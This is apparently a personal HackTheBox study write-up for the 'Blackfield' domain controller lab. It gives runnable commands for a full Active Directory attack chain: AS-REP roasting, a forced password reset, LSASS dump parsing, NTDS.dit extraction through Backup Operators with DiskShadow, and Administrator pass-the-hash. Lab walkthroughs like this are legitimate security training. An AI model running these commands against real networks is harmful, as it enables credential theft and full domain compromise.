---
tags: [HTB, Blackfield, Windows, ActiveDirectory, SMB, ASREPRoasting, BackupOperators, DCSync, PassTheHash, Hard]
platform: HackTheBox
os: Windows Server 2019
hostname: DC01
domain: BLACKFIELD.local
difficulty: Hard
ip: $BoxIP
status: Complete
---

# HTB: Blackfield, Full Walkthrough

## The gist

Blackfield is a Windows domain controller. Anonymous access to the `profiles$` SMB share exposed a large username list. One account had Kerberos pre-authentication disabled, so AS-REP roasting produced a crackable password. That account could reset another user's password through a ForceChangePassword permission. The second account could read the forensic share, where an LSASS dump exposed a backup service account. Backup Operators and the SeBackupPrivilege privilege allowed an offline NTDS extraction through Volume Shadow Copy. The domain Administrator hash then provided the final shell with pass-the-hash.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows Server 2019 |
| Hostname | DC01 |
| Domain | `$Domain` |
| Difficulty | Hard |
| IP | `$BoxIP` |

## Variables

```bash
boxset BoxName Blackfield
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Blackfield
boxset Domain BLACKFIELD.local
boxset FQDN dc01.BLACKFIELD.local
boxset Username support
boxset Username2 audit2020
boxset Username3 svc_backup
boxset Password $Password
boxset Password2 $Password2
boxset Password3 $Password3
boxset AdminUser Administrator
boxset AdminHash $AdminHash
```



## 1. Workspace setup

I created the standard folders before scanning so results and loot stayed separate.

```bash
boxstart $BoxName $BoxIP htb
```

## 2. Full TCP scan

I scanned every TCP port because domain controllers expose services outside the common web ports.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oA $BoxDir/nmap/allports
```

Open ports included 53, 88, 135, 139, 389, 445, 593, 3268, and 5985. This identified a domain controller with DNS, Kerberos, LDAP, SMB, and WinRM.

![[blackfield-2-allports.png]]

SCREENSHOT: Capture the completed all-port scan with the open-port list visible.

## 3. Service and version scan

I ran default scripts and version detection against the discovered ports.

```bash
sudo nmap -sC -sV -p 53,88,135,139,389,445,593,3268,5985 $BoxIP -oA $BoxDir/nmap/services
```

The scan identified DC01, the BLACKFIELD.local domain, Windows Server 2019, SMB signing, and a clock difference of roughly seven hours.

![[blackfield-3-services.png]]

SCREENSHOT: Capture the service scan showing the domain controller services and clock skew.

## 4. Local setup

I stored the domain values and added the hostname locally.

```bash
boxset Domain BLACKFIELD.local
boxset FQDN dc01.BLACKFIELD.local
echo "$BoxIP $Domain $FQDN" | sudo tee -a /etc/hosts
```

## 5. Clock synchronisation

Kerberos rejects requests when the local clock is too far from the domain controller. The normal NTP request did not return an eligible server, so I applied the observed offset manually.

```bash
sudo timedatectl set-ntp false
sudo ntpdate -u $BoxIP
sudo date -s "$(date -d '+6 hours 59 minutes 59 seconds' '+%Y-%m-%d %H:%M:%S')"
date
ping -c 1 $BoxIP
```

The manual adjustment restored the time relationship. The VPN can drop after changing the system clock, so I reconnected and verified reachability before continuing.

> [!warning] 💡 Hint
> **Watch out:** `ntpdate` may fail with an `ntpdig` or no-eligible-servers error. Use the skew reported by nmap for a manual `date -s` adjustment, then verify the VPN and target connection again.

## 6. Anonymous SMB enumeration

I tested guest SMB access and listed the available shares.

```bash
smbclient -N -L //$BoxIP
smbmap -H $BoxIP -u '' -p ''
smbclient //$BoxIP/profiles$ -N -c 'ls'
smbclient //$BoxIP/profiles$ -N -c 'ls' | awk '{print $1}' | grep -v '^\.' > $BoxDir/loot/users.txt
wc -l $BoxDir/loot/users.txt
```

The `profiles$` share was readable. Its directories exposed hundreds of profile names, which formed the username list. The forensic share required authentication.

> [!warning] 💡 Hint
> **Watch out:** Anonymous access to a profile share can leak valid usernames even when LDAP and RPC return nothing useful. Treat directory names as a username source and test the account format carefully.

![[blackfield-6-profiles.png]]

SCREENSHOT: Capture the anonymous share listing and profile directory names without exposing credentials.

## 7. AS-REP roasting

I tested the discovered usernames for accounts with Kerberos pre-authentication disabled. AS-REP roasting requests an encrypted response that can be cracked offline.

```bash
netexec ldap $BoxIP --port 389 -u $BoxDir/loot/users.txt -p '' --asreproast $BoxDir/loot/asrep.txt
```

The LDAP request identified `$Username` as a roasting target. The NetExec output file contained the AS-REP response.

```bash
sed -n '1p' $BoxDir/loot/asrep.txt
```

> [!warning] 💡 Hint
> **Watch out:** The default LDAPS connection can time out, and the Impacket `GetNPUsers.py` wrapper may fail because of a local package conflict. Force LDAP with `--port 389`, then check the output file because a successful roast may be quiet.

![[blackfield-7-asrep.png]]

SCREENSHOT: Capture the successful AS-REP result with the ticket value redacted.

## 8. Offline password cracking

I cracked the response locally with Hashcat.

```bash
hashcat -m 18200 $BoxDir/loot/asrep.txt /usr/share/wordlists/rockyou.txt --potfile-path $BoxDir/loot/hashcat.pot -o $BoxDir/loot/cracked.txt
cat $BoxDir/loot/cracked.txt
boxset Username $Username
boxset Password $Password
loot cred $Username $Password
```

Hashcat recovered the password for `$Username` without sending guesses to the domain.

![[blackfield-8-hashcat.png]]

SCREENSHOT: Capture the successful crack while redacting the password.

## 9. Credential validation

I checked the cracked credential against SMB, LDAP, and WinRM before relying on it.

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain
netexec ldap $BoxIP -u $Username -p $Password -d $Domain
netexec winrm $BoxIP -u $Username -p $Password -d $Domain
```

SMB and LDAP accepted the credential. WinRM did not, so I used the account for directory and share enumeration instead of treating it as a shell foothold.

## 10. BloodHound collection

I collected domain relationships to find permissions that were not visible from basic authentication checks.

```bash
cd $BoxDir/loot
bloodhound-python -u $Username -p $Password -d $Domain -dc $FQDN -ns $BoxIP -c All --zip -o $BoxDir/loot/
cd $BoxDir
```

The collection completed, but the local BloodHound GUI was unavailable because PostgreSQL was not initialised. I used direct ACL enumeration as the fallback.

> [!warning] 💡 Hint
> **Watch out:** A BloodHound GUI failure does not mean collection failed. Keep the archive and use a direct ACL query when the database is unavailable.

## 11. ACL enumeration

I checked the target account's directory permissions directly.

```bash
dacledit.py -action read -target $Username2 -u $Username -p $Password -d $Domain -dc-ip $BoxIP
```

The output showed that `$Username` had ForceChangePassword permission on `$Username2`. This permission lets the holder set a new password without knowing the old one.

![[blackfield-11-acl.png]]

SCREENSHOT: Capture the ForceChangePassword ACE and redact domain-sensitive values if needed.

## 12. ForceChangePassword abuse

I reset the target account password through the RPC interface, then validated the new credential.

```bash
rpcclient -U "$Domain/$Username%$Password" $BoxIP -c "setuserinfo2 $Username2 23 '$Password2'"
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain
loot cred $Username2 $Password2
```

The password reset succeeded and the account could access SMB.

> [!warning] 💡 Hint
> **Watch out:** ForceChangePassword does not require the old password. The important evidence is the ACL permission and successful validation after the reset, not a verbose success message from `rpcclient`.

## 13. Forensic share enumeration

I listed the authenticated shares and inspected the forensic share for files containing credentials.

```bash
smbclient -U "$Domain/$Username2%$Password2" //$BoxIP/forensic -c 'recurse ON; prompt OFF; mget *'
find $BoxDir -type f -printf '%p\n'
```

The share contained a memory-analysis archive. I extracted it locally.

```bash
unzip $BoxDir/loot/lsass.zip -d $BoxDir/loot/lsass
```

![[blackfield-13-forensic.png]]

SCREENSHOT: Capture the forensic share and downloaded archive names without exposing secrets.

## 14. LSASS parsing

An LSASS dump contains authentication material held by the Windows logon process. I parsed it offline with pypykatz.

```bash
pypykatz lsa minidump $BoxDir/loot/lsass/* | tee $BoxDir/loot/pypykatz.txt
grep -E "NT:|Username:" $BoxDir/loot/pypykatz.txt | head -20
```

The dump exposed a credential for `$Username3` and a cached Administrator credential. Cached domain credentials may be stale, so I validated the service account first.

```bash
boxset Username3 svc_backup
loot hash $Username3 $Hash
loot hash $AdminUser $CachedAdminHash
```

> [!warning] 💡 Hint
> **Watch out:** A cached Administrator entry is not proof that its password still works. Validate each recovered credential and prefer an active service account when it is available.

![[blackfield-14-pypykatz.png]]

SCREENSHOT: Capture the parsed account names and redact all password and hash values.

## 15. WinRM foothold as the backup account

I authenticated with the recovered service account and checked its groups and token privileges.

```bash
netexec winrm $BoxIP -u $Username3 -H $Hash3 -d $Domain
evil-winrm -i $BoxIP -u $Username3 -H $Hash3
```

The account was a member of Backup Operators and had SeBackupPrivilege and SeRestorePrivilege. These privileges allow protected files to be copied and restored when the copy is performed through an appropriate backup-aware tool.

```powershell
whoami
hostname
whoami /groups
whoami /priv
Test-Path C:\Users\$env:USERNAME\Desktop\user.txt
```

The user flag path existed and was not read.

![[blackfield-15-backup-operators.png]]

SCREENSHOT: Capture the Backup Operators membership and enabled backup privileges.

## 16. User flag checkpoint

```bash
shot user-flag
```

SCREENSHOT: Capture the user flag confirmation without reading or displaying its value.

## 17. DiskShadow volume copy

I used DiskShadow to expose a read-only shadow copy of the system volume. This avoids changing the live NTDS database.

```bash
cat > $BoxDir/www/vss.dsh <<'EOF'
set metadata C:\Windows\Temp\meta.cab
set context persistent nowriters
add volume c: alias mydrive
create
expose %mydrive% z:
EOF
unix2dos $BoxDir/www/vss.dsh
```

```powershell
cd C:\Windows\Temp
upload vss.dsh
diskshadow.exe /s C:\Windows\Temp\vss.dsh
```

The shadow copy was exposed as `Z:`.

> [!warning] 💡 Hint
> **Watch out:** DiskShadow scripts need Windows CRLF line endings. A Linux-created file with LF endings can truncate the final command or make the script fail, so run `unix2dos` before uploading it.

## 18. Copy NTDS and SYSTEM

I copied the domain database and SYSTEM hive from the shadow copy using the backup privilege.

```powershell
robocopy /b Z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.bak
```

I then transferred both files to the local loot directory and removed the temporary target copies.

```powershell
cd C:\Windows\Temp
download ntds.dit
download system.bak
```

> [!warning] 💡 Hint
> **Watch out:** Evil-WinRM upload and download only work reliably with bare filenames from the current directory. A full Windows path like `C:\Windows\Temp\ntds.dit` mangles the filename on the Kali side. Always `cd` to the target directory first, then use the bare filename.

## 19. Offline NTDS extraction

I parsed the copied database locally. The system Impacket wrapper failed on a local KeyListSecrets issue, so I used the working pipx-installed script.

```bash
/home/kali/.local/share/pipx/venvs/impacket/bin/secretsdump.py \
  -ntds $BoxDir/loot/ntds.dit -system $BoxDir/loot/system.bak LOCAL \
  -outputfile $BoxDir/loot/secretsdump
grep "Administrator" $BoxDir/loot/secretsdump.ntds | head -3
```

The dump returned the authoritative domain hashes. I stored the Administrator hash privately.

```bash
boxset AdminUser Administrator
boxset AdminHash $AdminHash
loot hash $AdminUser $AdminHash
```

> [!warning] 💡 Hint
> **Watch out:** A broken system `secretsdump` wrapper can be a local Python packaging problem, not a target failure. Try the known-good pipx Impacket installation before changing the attack path.

![[blackfield-18-secretsdump.png]]

SCREENSHOT: Capture successful NTDS parsing with all credential values redacted.

## 20. Administrator pass-the-hash validation

I validated the recovered hash over SMB, then used it for WinRM pass-the-hash.

```bash
netexec smb $BoxIP -u $AdminUser -H $AdminHash -d $Domain
evil-winrm -i $BoxIP -u $AdminUser -H $AdminHash
```

The shell identified as the domain Administrator on DC01.

```powershell
whoami
hostname
Test-Path C:\Users\$AdminUser\Desktop\root.txt
```

The root flag path existed and was not read.

![[blackfield-19-administrator.png]]

SCREENSHOT: Capture the Administrator shell and confirmed root flag path without displaying the flag.

## 21. Root flag checkpoint

```bash
shot winrm-admin-pth
shot root-flag
```

SCREENSHOT: Capture the Administrator shell and confirmed root flag path without displaying the flag.

## 22. Clean-down

I removed the temporary target files, deleted the shadow copy, and confirmed no persistence or accounts had been added.

```powershell
cd C:\Windows\Temp
del vss.dsh
del meta.cab
del ntds.dit
del system.bak
vssadmin delete shadows /for=C: /quiet
Test-Path C:\Windows\Temp\vss.dsh
Test-Path C:\Windows\Temp\ntds.dit
Test-Path C:\Windows\Temp\system.bak
```

The temporary files were absent and no accounts, web shells, or persistence had been created. I ran the box helper after verification.

```bash
boxdone
```

![[blackfield-20-clean-down.png]]

SCREENSHOT: Capture the cleanup verification showing the temporary files are absent.

## Credentials

| Account | Source | Use |
|---|---|---|
| `$Username` | AS-REP roast from anonymous username enumeration | ACL enumeration and password reset |
| `$Username2` | ForceChangePassword permission | Read forensic share |
| `$Username3` | LSASS dump parsed with pypykatz | WinRM, Backup Operators |
| `$AdminUser` | Offline NTDS extraction | Pass-the-hash, Administrator shell |

Passwords and hashes are intentionally omitted.

## Key lessons

- Anonymous SMB access can expose usernames even when anonymous LDAP and RPC enumeration are empty.
- AS-REP roasting requires Kerberos pre-authentication to be disabled on the target account, so test this whenever a username list is available.
- `netexec ldap --asreproast` is a reliable fallback when `GetNPUsers.py` has a local version conflict. Add `--port 389` when LDAPS is not confirmed.
- ForceChangePassword is a direct password-reset permission and does not require the old password.
- The ForceChangePassword extended right is represented by ACE GUID `00299570-246d-11d0-a768-00aa006e0529`.
- A BloodHound GUI failure does not invalidate the collection. Direct ACL tools can identify the same path.
- Cached credentials from LSASS may be stale. Validate them before committing to a branch.
- Backup Operators and SeBackupPrivilege can expose NTDS without a Kerberos DCSync path.
- DiskShadow scripts need CRLF line endings when created on Linux.
- NTDS.dit contains domain hashes. SAM alone would not provide the domain database on a domain controller.
- A local Impacket packaging failure can be bypassed with the working pipx installation.
- NTDS.dit is the authoritative source for Administrator NT hashes. The LSASS-cached hash may be stale if the password changed after the last interactive logon.

## External Resources

- [HackTricks: AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [HackTricks: Abusing Backup Operators](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)
- [HackTricks: DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [HackTricks: Pass the Hash](https://book.hacktricks.xyz/windows-hardening/ntlm/pass-the-hash)
- [PayloadsAllTheThings: Active Directory ACL Abuse](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#acl-abuse)
- [PayloadsAllTheThings: NTDS Extraction](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ntds)
- [LOLBAS: DiskShadow](https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/)
- [ippsec: Blackfield](https://ippsec.rocks/?#Blackfield)

## Checklist

- [x] Full TCP scan and service scan completed
- [x] Domain and hostname identified
- [x] Anonymous SMB username enumeration completed
- [x] AS-REP roast captured and cracked offline
- [x] ForceChangePassword path identified and used
- [x] LSASS dump parsed offline
- [x] Backup Operators path used to extract NTDS
- [x] Administrator hash validated with pass-the-hash
- [x] User and root flag paths confirmed without reading values
- [x] Temporary files and shadow copy removed
## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Windows - SMB Enum]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - LSASS Parsing]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - Pass the Hash]] -- technique used in this walkthrough

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- shares a similar enumeration or escalation pattern
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.

## Attack Chain

1. [[RUNBOOK V2/Windows - SMB Enum]] used anonymous share access to build a username list and find forensic material.
2. [[RUNBOOK V2/AD - LSASS Parsing]] extracted an account credential from the recovered memory dump.
3. [[RUNBOOK V2/AD - Backup Operators]] copied protected directory data through the backup privilege path.
4. [[RUNBOOK V2/AD - Pass the Hash]] validated the administrator NT hash and opened the privileged shell.

## Flags

- `user.txt`: `$UserFlag` (keep the value private)
- `root.txt`: `$RootFlag` (keep the value private)
- `proof.txt`: `$ProofFlag` (keep the value private)

## Lessons Learned

- Share permissions can expose both usernames and forensic artifacts before authentication.
- Backup privileges can be more valuable than an ordinary administrator group membership because they bypass file-read checks.
